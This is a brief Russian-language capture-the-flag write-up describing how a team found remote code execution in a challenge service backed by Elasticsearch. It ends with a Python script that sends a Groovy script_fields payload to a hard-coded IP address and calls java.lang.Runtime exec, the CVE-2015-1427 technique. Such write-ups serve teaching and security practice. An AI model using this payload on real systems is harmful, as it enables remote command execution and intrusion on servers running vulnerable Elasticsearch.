1. Обратили внимание на ссылки вида href="/show?id=q=_id:4" и подсказку в описании задачи о быстром поиске, про эластик мы поняли сииильно позже.
2. Чекалку ip натравили на свой сервак, получили инфу что прилажка на руби и реально ходит туда куда сказали
3. Дернулли постом /show?id=q=_id:5 получили 400 - поняли что там сенатра 
4. Погуглили rce увидили только две на path traversal и на xss через 400-ку. Потеряли много времени в попытке их реализовать.
5. Дошло наконец-то про эластик, полгуглили на тему elastic rce, нашли https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh
6. Написали простенький скрипт по засы:
```python 
import sys
import requests, json
request = lambda pl: requests.get("http://89.163.129.121:5000/check/_search", params={"source": json.dumps(pl)}).text

data = {"size":1,"script_fields": {"infophp": {"script":'''java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("%s").getText()''' % cmd}}}
request(data)
```

 
